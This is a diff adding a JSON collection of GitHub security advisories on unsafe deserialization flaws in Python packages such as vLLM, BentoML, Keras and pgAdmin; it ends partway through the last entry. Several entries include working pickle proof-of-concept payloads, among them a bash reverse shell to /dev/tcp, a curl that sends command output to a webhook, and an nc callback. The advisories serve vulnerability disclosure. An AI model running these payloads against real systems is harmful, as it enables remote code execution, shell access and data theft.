@@ -1,0 +1,439 @@
+[
+  {
+    "ghsa_id": "GHSA-74vm-8frp-7w68",
+    "cve_id": "CVE-2026-25632",
+    "summary": "EPyT-Flow vulnerable to unsafe JSON deserialization (__type__)",
+    "description": "### Impact\nEPyT-Flow’s REST API parses attacker-controlled JSON request bodies using a custom deserializer (my_load_from_json) that supports a __type__ field. When __type__ is present, the deserializer dynamically imports an attacker-specified module/class and instantiates it with attacker-supplied arguments. This allows invoking dangerous classes such as subprocess.Popen, which can lead to OS command execution during JSON parsing. This also affects the loading of JSON files.\n\n### Patches\nEPyT-Flow  has been patched in 0.16.1 -- affects all versions <= 0.16.0\n\n### Workarounds\nDo not load any JSON from untrusted sources and do not expose the REST API.\n\n### Credits\nEPyT-Flow  thanks Jarrett Chan (@syphonetic) for detecting and reporting the bug.",
+    "severity": "critical",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2026-02-04T20:34:28Z",
+    "references": [
+      "https://github.com/WaterFutures/EPyT-Flow/security/advisories/GHSA-74vm-8frp-7w68",
+      "https://github.com/WaterFutures/EPyT-Flow/commit/3fff9151494c7dbc72073830b734f0a7e550e385",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-25632",
+      "https://github.com/WaterFutures/EPyT-Flow/releases/tag/v0.16.1",
+      "https://github.com/advisories/GHSA-74vm-8frp-7w68"
+    ],
+    "patch_urls": [
+      "https://github.com/WaterFutures/EPyT-Flow/commit/3fff9151494c7dbc72073830b734f0a7e550e385"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "epyt-flow",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 0.16.1"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-hj4w-hm2g-p6w5",
+    "cve_id": "CVE-2025-32444",
+    "summary": "vLLM Vulnerable to Remote Code Execution via Mooncake Integration",
+    "description": "## Impacted Deployments\n\n**Note that vLLM instances that do NOT make use of the mooncake integration are NOT vulnerable.**\n\n## Description\n\nvLLM integration with mooncake is vaulnerable to remote code execution due to using `pickle` based serialization over unsecured ZeroMQ sockets. The vulnerable sockets were set to listen on all network interfaces, increasing the likelihood that an attacker is able to reach the vulnerable ZeroMQ sockets to carry out an attack.\n\n\nThis is a similar to [GHSA - x3m8 - f7g5 - qhm7](https://github.com/vllm-project/vllm/security/advisories/GHSA-x3m8-f7g5-qhm7), the problem is in\n\nhttps://github.com/vllm-project/vllm/blob/32b14baf8a1f7195ca09484de3008063569b43c5/vllm/distributed/kv_transfer/kv_pipe/mooncake_pipe.py#L179\n\nHere [recv_pyobj()](https://github.com/zeromq/pyzmq/blob/453f00c5645a3bea40d79f53aa8c47d85038dc2d/zmq/sugar/socket.py#L961) Contains implicit `pickle.loads()`, which leads to potential RCE.",
+    "severity": "critical",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-04-29T14:52:29Z",
+    "references": [
+      "https://github.com/vllm-project/vllm/security/advisories/GHSA-hj4w-hm2g-p6w5",
+      "https://github.com/vllm-project/vllm/security/advisories/GHSA-x3m8-f7g5-qhm7",
+      "https://github.com/vllm-project/vllm/commit/a5450f11c95847cf51a17207af9a3ca5ab569b2c",
+      "https://github.com/vllm-project/vllm/blob/32b14baf8a1f7195ca09484de3008063569b43c5/vllm/distributed/kv_transfer/kv_pipe/mooncake_pipe.py#L179",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-32444",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/vllm/PYSEC-2025-42.yaml",
+      "https://github.com/advisories/GHSA-hj4w-hm2g-p6w5"
+    ],
+    "patch_urls": [
+      "https://github.com/vllm-project/vllm/commit/a5450f11c95847cf51a17207af9a3ca5ab569b2c"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "vllm",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.6.5, < 0.8.5"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-rj98-crf4-g69w",
+    "cve_id": "CVE-2024-2044",
+    "summary": "pgAdmin 4 vulnerable to Unsafe Deserialization and Remote Code Execution by an Authenticated user",
+    "description": "pgAdmin prior to version 8.4 is affected by a path-traversal vulnerability while deserializing users’ sessions in the session handling code. If the server is running on Windows, an unauthenticated attacker can load and deserialize remote pickle objects and gain code execution. If the server is running on POSIX/Linux, an authenticated attacker can upload pickle objects, deserialize them and gain code execution.",
+    "severity": "critical",
+    "cvss_score": 10.0,
+    "cwes": [
+      "CWE-22",
+      "CWE-31",
+      "CWE-502"
+    ],
+    "published_at": "2024-03-07T21:30:22Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-2044",
+      "https://github.com/pgadmin-org/pgadmin4/issues/7258",
+      "https://github.com/pgadmin-org/pgadmin4/commit/4e49d752fba72953acceeb7f4aa2e6e32d25853d",
+      "https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce",
+      "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LUYN2JXKKHFSVTASH344TBRGWDH64XQV",
+      "https://github.com/advisories/GHSA-rj98-crf4-g69w"
+    ],
+    "patch_urls": [
+      "https://github.com/pgadmin-org/pgadmin4/commit/4e49d752fba72953acceeb7f4aa2e6e32d25853d"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "pgAdmin4",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 8.4"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-436v-jg82-p533",
+    "cve_id": "CVE-2026-21531",
+    "summary": "Azure AI Language Authoring Elevation of Privilege Vulnerability can Lead to RCE",
+    "description": "Deserialization of untrusted data in the Azure AI Language Conversations Authoring client library for Python allows an unauthorized attacker to execute code over a network.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2026-02-10T18:30:42Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-21531",
+      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-21531",
+      "https://github.com/advisories/GHSA-436v-jg82-p533"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "azure-ai-language-conversations-authoring",
+        "ecosystem": "pip",
+        "vulnerable_range": "< 1.0.0b4"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-cvhh-q5g5-qprp",
+    "cve_id": "CVE-2025-49655",
+    "summary": "Keras framework vulnerable to deserialization of untrusted data",
+    "description": "Deserialization of untrusted data can occur in versions of the Keras framework running versions 3.11.0 up to but not including 3.11.3, enabling a maliciously uploaded Keras file containing a TorchModuleWrapper class to run arbitrary code on an end user’s system when loaded despite safe mode being enabled. The vulnerability can be triggered through both local and remote files.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-10-17T18:31:07Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-49655",
+      "https://github.com/keras-team/keras/pull/21575",
+      "https://hiddenlayer.com/sai_security_advisor/2025-10-keras",
+      "https://github.com/advisories/GHSA-cvhh-q5g5-qprp"
+    ],
+    "patch_urls": [
+      "https://github.com/keras-team/keras/pull/21575"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "keras",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 3.11.0, < 3.11.3"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-f74j-gffq-vm9p",
+    "cve_id": "CVE-2025-62515",
+    "summary": "pyquokka is Vulnerable to Remote Code Execution by Pickle Deserialization via FlightServer ",
+    "description": "### Description\n\nIn the FlightServer class of the pyquokka framework, the do_action() method directly uses pickle.loads() to deserialize action bodies received from Flight clients without any sanitization or validation, which results in a remote code execution vulnerability. The vulnerable code is located in pyquokka/flight.py at line 283, where arbitrary data from Flight clients is directly passed to pickle.loads().\n\nEven more concerning, when FlightServer is configured to listen on 0.0.0.0 (as shown in the provided server example at line 339), this allows attackers across the entire network to perform arbitrary remote code execution by sending malicious pickled payloads through the set_configs action.\n\nIn addition, the functions cache_garbage_collect, do_put, and do_get also contain vulnerability points where pickle.loads is used to deserialize untrusted remote data. Please review and fix these issues accordingly. This report uses the set_configs action as an example.\n\n\n### Proof of Concept\n\n* Step 1:\nThe victim user starts a FlightServer that binds to the network interface, e.g.:\n```\nserver = FlightServer(\"0.0.0.0\", location = \"grpc+tcp://0.0.0.0:5005\")\nserver.serve()\n````\n* Step 2:\nThe attacker can then send malicious pickle dump data through the Flight client connection. The provided PoC demonstrates how an attacker can execute \"ls -l\" command:\n\n```python\nclass RCE:\ndef __reduce__(self):\nimport os\nreturn (os.system, ('ls -l',))\n\nimport pickle\naction_body = pickle.dumps(RCE())\naction = pyarrow.flight.Action(\"set_configs\", action_body)\n```\n\nWhen the server receives this payload, the FlightServer.do_action() method calls pickle.loads(action.body.to_pybytes()) on line 283, which triggers the execution of the malicious code through Python's pickle deserialization mechanism. The provided flight_client.py demonstrates a complete PoC that connects to the vulnerable server and executes arbitrary commands through the pickle deserialization vulnerability.\n\nWhen the vulnerability is reproduced, python flight.py can be run to init the server and then run flight_client.py. There is an attack demo in the attachment.\n\n### Impact\n\nRemote code execution on the victim's machine over the network. Once the victim starts the FlightServer with network binding (especially 0.0.0.0), an attacker on the network can gain arbitrary code execution by connecting to the Flight endpoint and sending crafted pickle payloads through the set_configs action. This vulnerability allows for:\n\n- Complete system compromise\n- Data exfiltration\n- Lateral movement within the network\n- Denial of service attacks\n- Installation of persistent backdoors\n\n### Mitigation\n\n1. **Replace unsafe deserialization**: Replace `pickle.loads()` with safer alternatives such as:\n   - JSON serialization for simple data structures\n   - Protocol Buffers or MessagePack for complex data\n   - If pickle must be used, implement a custom `Unpickler` with a restricted `find_class()` method that only allows whitelisted classes\n\n2. **Network security**: \n   - If the service is intended for internal use only, bind to localhost (`127.0.0.1`) instead of `0.0.0.0`\n   - Implement authentication and authorization mechanisms\n\n3. **Security warnings**: When starting the service on public interfaces, display clear security warnings to inform users about the risks.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-10-17T18:08:09Z",
+    "references": [
+      "https://github.com/marsupialtail/quokka/security/advisories/GHSA-f74j-gffq-vm9p",
+      "https://github.com/marsupialtail/quokka/blob/master/pyquokka/flight.py#L283",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-62515",
+      "https://github.com/advisories/GHSA-f74j-gffq-vm9p"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "pyquokka",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 0.3.1"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-538v-3wq9-4h3r",
+    "cve_id": "CVE-2025-61622",
+    "summary": "Apache Pyfory python is vulnerable to deserialization of untrusted data",
+    "description": "Deserialization of untrusted data in python in pyfory versions 0.12.0 through 0.12.2, or the legacy pyfury versions from 0.1.0 through 0.10.3: allows arbitrary code execution. An application is vulnerable if it reads pyfory serialized data from untrusted sources. An attacker can craft a data stream that selects pickle-fallback serializer during deserialization, leading to the execution of `pickle.loads`, which is vulnerable to remote code execution.\n\nUsers are recommended to upgrade to pyfory version 0.12.3 or later, which has removed pickle fallback serializer and thus fixes this issue.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-10-01T12:30:27Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-61622",
+      "https://lists.apache.org/thread/vfn9hp9qt06db5yo1gmj3l114o3o2csd",
+      "https://github.com/apache/fory/pull/2629",
+      "https://github.com/apache/fory/commit/379b948ecae5c3b849e5bdb3997978c9a163e40b",
+      "https://github.com/apache/fory/releases/tag/v0.12.3",
+      "http://www.openwall.com/lists/oss-security/2025/09/29/3",
+      "https://github.com/advisories/GHSA-538v-3wq9-4h3r"
+    ],
+    "patch_urls": [
+      "https://github.com/apache/fory/pull/2629",
+      "https://github.com/apache/fory/commit/379b948ecae5c3b849e5bdb3997978c9a163e40b"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "pyfory",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.12.0, < 0.12.3"
+      },
+      {
+        "package": "pyfury",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.1.0, <= 0.10.3"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-5w3j-gwgh-4rfv",
+    "cve_id": "CVE-2025-6544",
+    "summary": "H2O affected by a deserialization vulnerability",
+    "description": "A deserialization vulnerability exists in h2oai/h2o-3 versions <= 3.46.0.7, allowing attackers to read arbitrary system files and execute arbitrary code. The vulnerability arises from improper handling of JDBC connection parameters, which can be exploited by bypassing regular expression checks and using double URL encoding. This issue impacts all users of the affected versions.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-09-22T18:30:34Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-6544",
+      "https://github.com/h2oai/h2o-3/commit/0298ee348f5c73673b7b542158081e79605f5f25",
+      "https://huntr.com/bounties/53f35a0f-d644-4f82-93aa-89fe7e0aed40",
+      "https://github.com/advisories/GHSA-5w3j-gwgh-4rfv"
+    ],
+    "patch_urls": [
+      "https://github.com/h2oai/h2o-3/commit/0298ee348f5c73673b7b542158081e79605f5f25"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "ai.h2o:h2o-core",
+        "ecosystem": "maven",
+        "vulnerable_range": "<= 3.46.0.7"
+      },
+      {
+        "package": "h2o",
+        "ecosystem": "pip",
+        "vulnerable_range": "<= 3.46.0.7"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-hjq4-87xh-g4fv",
+    "cve_id": "CVE-2025-47277",
+    "summary": "vLLM Allows Remote Code Execution via PyNcclPipe Communication Service",
+    "description": "### Impacted Environments\n\nThis issue ONLY impacts environments using the `PyNcclPipe` KV cache transfer integration with the V0 engine. No other configurations are affected.\n\n### Summary\nvLLM supports the use of the `PyNcclPipe` class to establish a peer-to-peer communication domain for data transmission between distributed nodes. The GPU-side KV-Cache transmission is implemented through the `PyNcclCommunicator` class, while CPU-side control message passing is handled via the `send_obj` and `recv_obj` methods on the CPU side.​ \n\nA remote code execution vulnerability exists in the `PyNcclPipe` service. Attackers can exploit this by sending malicious serialized data to gain server control privileges. \n\nThe intention was that this interface should only be exposed to a private network using the IP address specified by the `--kv-ip` CLI parameter. The vLLM documentation covers how this must be limited to a secured network: https://docs.vllm.ai/en/latest/deployment/security.html\n\nUnfortunately, the default behavior from PyTorch is that the `TCPStore` interface will listen on ALL interfaces, regardless of what IP address is provided. The IP address given was only used as a client-side address to use. vLLM was fixed to use a workaround to force the `TCPStore` instance to bind its socket to a specified private interface.\n\nThis issue was reported privately to PyTorch and they determined that this behavior was intentional.\n\n### Details\nThe `PyNcclPipe`  implementation contains a critical security flaw where it directly processes client-provided data using `pickle.loads`  , creating an unsafe deserialization vulnerability that can lead to ​Remote Code Execution.\n\n1. Deploy a `PyNcclPipe` service configured to listen on port `18888` when launched:\n```python\nfrom vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe import PyNcclPipe\nfrom vllm.config import KVTransferConfig\n\nconfig=KVTransferConfig(\n    kv_ip=\"0.0.0.0\",\n    kv_port=18888,\n    kv_rank=0,\n    kv_parallel_size=1,\n    kv_buffer_size=1024,\n    kv_buffer_device=\"cpu\"\n)\n\np=PyNcclPipe(config=config,local_rank=0)\np.recv_tensor() # Receive data\n```\n\n2. The attacker crafts malicious packets and sends them to the `PyNcclPipe` service:\n\n```python\nfrom vllm.distributed.utils import StatelessProcessGroup\n\nclass Evil:\n    def __reduce__(self):\n        import os\n        cmd='/bin/bash -c \"bash -i >& /dev/tcp/172.28.176.1/8888 0>&1\"'\n        return (os.system,(cmd,))\n\nclient = StatelessProcessGroup.create(\n    host='172.17.0.1',\n    port=18888,\n    rank=1,\n    world_size=2,\n)\n\nclient.send_obj(obj=Evil(),dst=0)\n```\n\nThe call stack triggering ​RCE is as follows:\n\n```\nvllm.distributed.kv_transfer.kv_pipe.pynccl_pipe.PyNcclPipe._recv_impl\n\t-> vllm.distributed.kv_transfer.kv_pipe.pynccl_pipe.PyNcclPipe._recv_metadata\n\t\t-> vllm.distributed.utils.StatelessProcessGroup.recv_obj\n\t\t\t-> pickle.loads \n```\n\nGetshell as follows: \n\n![image](https://github.com/user-attachments/assets/487746ee-3b77-4e4d-99cc-d1ca08431215)\n\n### Reporters\n\nThis issue was reported independently by three different parties:\n\n* @kikayli (Zhuque Lab, Tencent)\n* @omjeki\n* Russell Bryant (@russellb)\n\n### Fix\n\n* https://github.com/vllm-project/vllm/pull/15988 -- vLLM now limits the `TCPStore` socket to the private interface as configured.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-05-20T18:04:30Z",
+    "references": [
+      "https://github.com/vllm-project/vllm/security/advisories/GHSA-hjq4-87xh-g4fv",
+      "https://github.com/vllm-project/vllm/pull/15988",
+      "https://github.com/vllm-project/vllm/commit/0d6e187e88874c39cda7409cf673f9e6546893e7",
+      "https://docs.vllm.ai/en/latest/deployment/security.html",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-47277",
+      "https://github.com/advisories/GHSA-hjq4-87xh-g4fv"
+    ],
+    "patch_urls": [
+      "https://github.com/vllm-project/vllm/pull/15988",
+      "https://github.com/vllm-project/vllm/commit/0d6e187e88874c39cda7409cf673f9e6546893e7"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "vllm",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 0.6.5, < 0.8.5"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-mcrp-whpw-jp68",
+    "cve_id": "CVE-2024-12029",
+    "summary": "InvokeAI Deserialization of Untrusted Data vulnerability",
+    "description": "A remote code execution vulnerability exists in invoke-ai/invokeai versions 5.3.1 through 5.4.2 via the /api/v2/models/install API. The vulnerability arises from unsafe deserialization of model files using torch.load without proper validation. Attackers can exploit this by embedding malicious code in model files, which is executed upon loading. This issue is fixed in version 5.4.3rc2.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-03-21T15:32:15Z",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-12029",
+      "https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/invokeai/PYSEC-2025-9.yaml",
+      "https://huntr.com/bounties/9b790f94-1b1b-4071-bc27-78445d1a87a3",
+      "https://github.com/invoke-ai/InvokeAI/commit/ed46acee79460189b38c164321b14bdfbf3073c9",
+      "https://github.com/advisories/GHSA-mcrp-whpw-jp68"
+    ],
+    "patch_urls": [
+      "https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e",
+      "https://github.com/invoke-ai/InvokeAI/commit/ed46acee79460189b38c164321b14bdfbf3073c9"
+    ],
+    "vulnerabilities": [
+      {
+        "package": "InvokeAI",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 5.3.1, < 5.4.3rc2"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-7v4r-c989-xh26",
+    "cve_id": "CVE-2025-32375",
+    "summary": "BentoML's runner server Vulnerable to Remote Code Execution (RCE) via Insecure Deserialization",
+    "description": "### Summary\nThere was an insecure deserialization in BentoML's runner server. By setting specific headers and parameters in the POST request, it is possible to execute any unauthorized arbitrary code on the server, which will grant the attackers to have the initial access and information disclosure on the server.\n\n### PoC\n - First, create a file named **model.py** to create a simple model and save it\n```\nimport bentoml\nimport numpy as np\n\nclass mymodel:\n    def predict(self, info):\n        return np.abs(info)\n    def __call__(self, info):\n        return self.predict(info)\n\nmodel = mymodel()\nbentoml.picklable_model.save_model(\"mymodel\", model)\n```\n- Then run the following command to save this model\n```\npython3 model.py\n```\n- Next, create **bentofile.yaml** to build this model\n```\nservice: \"service.py\"  \ndescription: \"A model serving service with BentoML\"  \npython:\n  packages:\n    - bentoml\n    - numpy\nmodels:\n  - tag: MyModel:latest  \ninclude:\n  - \"*.py\"  \n```\n- Then, create **service.py** to host this model\n```\nimport bentoml\nfrom bentoml.io import NumpyNdarray\nimport numpy as np\n\n\nmodel_runner = bentoml.picklable_model.get(\"mymodel:latest\").to_runner()\n\nsvc = bentoml.Service(\"myservice\", runners=[model_runner])\n\nasync def predict(input_data: np.ndarray):\n\n    input_columns = np.split(input_data, input_data.shape[1], axis=1)\n    result_generator = model_runner.async_run(input_columns, is_stream=True)\n    async for result in result_generator:\n        yield result\n```\n- Then, run the following commands to build and host this model\n```\nbentoml build\nbentoml start-runner-server --runner-name mymodel --working-dir . --host 0.0.0.0 --port 8888\n```\n- Finally, run this below python script to exploit insecure deserialization vulnerability in BentoML's runner server.\n```\nimport requests\nimport pickle\n\nurl = \"http://0.0.0.0:8888/\"\n\nheaders = {\n    \"args-number\": \"1\",\n    \"Content-Type\": \"application/vnd.bentoml.pickled\",\n    \"Payload-Container\": \"NdarrayContainer\", \n    \"Payload-Meta\": '{\"format\": \"default\"}',\n    \"Batch-Size\": \"-1\",\n}\n\nclass P:\n    def __reduce__(self):\n        return  (__import__('os').system, ('curl -X POST -d \"$(id)\" https://webhook.site/61093bfe-a006-4e9e-93e4-e201eabbb2c3',))\n\nresponse = requests.post(url, headers=headers, data=pickle.dumps(P()))\n\nprint(response)\n```\nAnd I can replace the **NdarrayContainer** with **PandasDataFrameContainer** in **Payload-Container** header and the exploit still working.\nAfter running **exploit.py** then the output of the command **id** will be send out to the WebHook server.\n\n### Root Cause Analysis:\n\n- When handling a request in BentoML runner server in `src/bentoml/_internal/server/runner_app.py`, when the request header `args-number` is equal to 1, it will call the function `_deserialize_single_param` like the code below:\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L291-L298\nasync def _request_handler(request: Request) -> Response:\n    assert self._is_ready\n\n    arg_num = int(request.headers[\"args-number\"])\n    r_: bytes = await request.body()\n\n    if arg_num == 1:\n        params: Params[t.Any] = _deserialize_single_param(request, r_)\n```\n- Then this is the function of `_deserialize_single_param`, which will take the value of all request headers of `Payload-Container`, `Payload-Meta` and `Batch-Size` and the crafted into `Payload` class which will contain the data from `request.body`\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L376-L393\ndef _deserialize_single_param(request: Request, bs: bytes) -> Params[t.Any]:\n    container = request.headers[\"Payload-Container\"]\n    meta = json.loads(request.headers[\"Payload-Meta\"])\n    batch_size = int(request.headers[\"Batch-Size\"])\n    kwarg_name = request.headers.get(\"Kwarg-Name\")\n    payload = Payload(\n        data=bs,\n        meta=meta,\n        batch_size=batch_size,\n        container=container,\n    )\n    if kwarg_name:\n        d = {kwarg_name: payload}\n        params: Params[t.Any] = Params(**d)\n    else:\n        params: Params[t.Any] = Params(payload)\n\n    return params\n```\n- After crafting `Params` containing payload, it will call to function `infer` with `params` variable as input\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L303-L304\ntry:\n  payload = await infer(params)\n```\n- Inside function `infer`, the `params` variable with is belong to class `Params` will call the function `map` of that class with `AutoContainer.from_payload` as a parameter.\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/server/runner_app.py#L278-L289\nasync def infer(params: Params[t.Any]) -> Payload:\n      params = params.map(AutoContainer.from_payload)\n\n      try:\n          ret = await runner_method.async_run(\n              *params.args, **params.kwargs\n          )\n      except Exception:\n          traceback.print_exc()\n          raise\n\n      return AutoContainer.to_payload(ret, 0)\n```\n- Inside class `Params` define the function `map` which will call the `AutoContainer.from_payload` function with arguments, which are `data`, `meta`, `batch_size` and `container`\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/utils.py#L59-L66\ndef map(self, function: t.Callable[[T], To]) -> Params[To]:\n    \"\"\"\n    Apply a function to all the values in the Params and return a Params of the\n    return values.\n    \"\"\"\n    args = tuple(function(a) for a in self.args)\n    kwargs = {k: function(v) for k, v in self.kwargs.items()}\n    return Params[To](*args, **kwargs)\n```\n- Inside class `AutoContainer` class have defined the function `from_payload` which will find the class by the `payload.container` , which is the value of header `Payload-Container`, and it will call the function `from_payload` from the chosen class as return value\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L710-L712\ndef from_payload(cls, payload: Payload) -> t.Any:\n    container_cls = DataContainerRegistry.find_by_name(payload.container)\n    return container_cls.from_payload(payload)\n```\nAnd if the attacker set value of header `Payload-Container` to `NdarrayContainer` or `PandasDataFrameContainer`, it will call `from_payload` and when it then check if the `payload.meta[\"format\"] == \"default\"` it will call `pickle.loads(payload.data)` and `payload.meta[\"format\"]` is the value of header `Payload-Meta` and the attacker can set it to `{\"format\": \"default\"}` and `payload.data` is the value of `request.body` which is the payload from malicious `class P` in my request, which will trigger `__reduce__` method and then execute arbitrary commands (for my example is the `curl` command)\n```\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L411-L416\ndef from_payload(\n    cls,\n    payload: Payload,\n) -> ext.PdDataFrame:\n    if payload.meta[\"format\"] == \"default\":\n        return pickle.loads(payload.data)\nhttps://github.com/bentoml/BentoML/blob/main/src/bentoml/_internal/runner/container.py#L306-L312\ndef from_payload(\n    cls,\n    payload: Payload,\n) -> ext.NpNDArray:\n    format = payload.meta.get(\"format\", \"default\")\n    if format == \"default\":\n        return pickle.loads(payload.data)\n```\n### Impact\nIn the above Proof of Concept, I have shown how the attacker can execute command **id** and send the output of the command to the outside. By replacing **id** command with any OS commands, this insecure deserialization in BentoML's runner server will grant the attacker the permission to gain the remote shell on the server and injecting backdoors to persist access.",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-04-09T12:59:45Z",
+    "references": [
+      "https://github.com/bentoml/BentoML/security/advisories/GHSA-7v4r-c989-xh26",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-32375",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2025-32.yaml",
+      "https://github.com/advisories/GHSA-7v4r-c989-xh26"
+    ],
+    "patch_urls": [],
+    "vulnerabilities": [
+      {
+        "package": "bentoml",
+        "ecosystem": "pip",
+        "vulnerable_range": ">= 1.0.0a1, < 1.4.8"
+      }
+    ]
+  },
+  {
+    "ghsa_id": "GHSA-33xw-247w-6hmc",
+    "cve_id": "CVE-2025-27520",
+    "summary": "BentoML Allows Remote Code Execution (RCE) via Insecure Deserialization",
+    "description": "### Summary\nA Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified in the latest version(v1.4.2) of BentoML. It allows any unauthenticated user to execute arbitrary code on the server.\n\n### Details\nIt exists an unsafe code segment in `serde.py`: \n```Python\ndef deserialize_value(self, payload: Payload) -> t.Any:\n    if \"buffer-lengths\" not in payload.metadata:\n        return pickle.loads(b\"\".join(payload.data))\n```\nThrough data flow analysis, it is confirmed that the `payload `content is sourced from an HTTP request, which can be fully manipulated by the attack. Due to the lack of validation in the code, maliciously crafted serialized data can execute harmful actions during deserialization.\n\n### PoC\nEnvironment:\n\n- Server host:\n  - IP: 10.98.36.123\n  - OS: Ubuntu \n- Attack host:\n  - IP: 10.98.36.121\n  - OS: Ubuntu \n\n\n\n1. Follow the instructions on the BentoML official README(https://github.com/bentoml/BentoML) to set up the environment.\n\n1.1 Install BentoML (Server host: 10.98.36.123) :\n` pip install -U bentoml`\n\n1.2 Define APIs in a `service.py` file (Server host: 10.98.36.123) :\n``` Python\nfrom __future__ import annotations\n\nimport bentoml\n\n@bentoml.service(\n    resources={\"cpu\": \"4\"}\n)\nclass Summarization:\n    def __init__(self) -> None:\n        import torch\n        from transformers import pipeline\n\n        device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n        self.pipeline = pipeline('summarization', device=device)\n\n    @bentoml.api(batchable=True)\n    def summarize(self, texts: list[str]) -> list[str]:\n        results = self.pipeline(texts)\n        return [item['summary_text'] for item in results]\n```\n\n\n1.3 Run the service code (Server host: 10.98.36.123) :\n``` Bash\npip install torch transformers  # additional dependencies for local run\n\nbentoml serve\n```\n\n\n2. Start nc listening on the attacking host (Attack host: 10.98.36.121) :\n`nc -lvvp 1234`\n\n3. Send maliciously crafted request (Attack host: 10.98.36.121) :\n``` Python\nimport pickle\nimport os\nimport requests\n\nheaders = {'Content-Type': 'application/vnd.bentoml+pickle'}\n\nclass Evil:\n    def __reduce__(self):\n        return(os.system, ('nc 10.98.36.121 1234',))\n\npayload = pickle.dumps(Evil())\n\nrequests.post(\"http://10.98.36.123:3000/summarize\", data=payload, headers=headers)\n```\n\n\n4. Attack success (Attack host: 10.98.36.121) :\nThe server host(10.98.36.123) has connected to the attacker's host(10.98.36.121) listening on port 1234.\n![nc](https://github.com/user-attachments/assets/858cba4a-6880-498f-b922-dd9a2dc78a85)\n\n\n\n### Impact\nRemote Code Execution (RCE).",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cwes": [
+      "CWE-502"
+    ],
+    "published_at": "2025-04-04T16:05:32Z",
+    "references": [
+      "https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc",
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-27520",
+      "https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194",
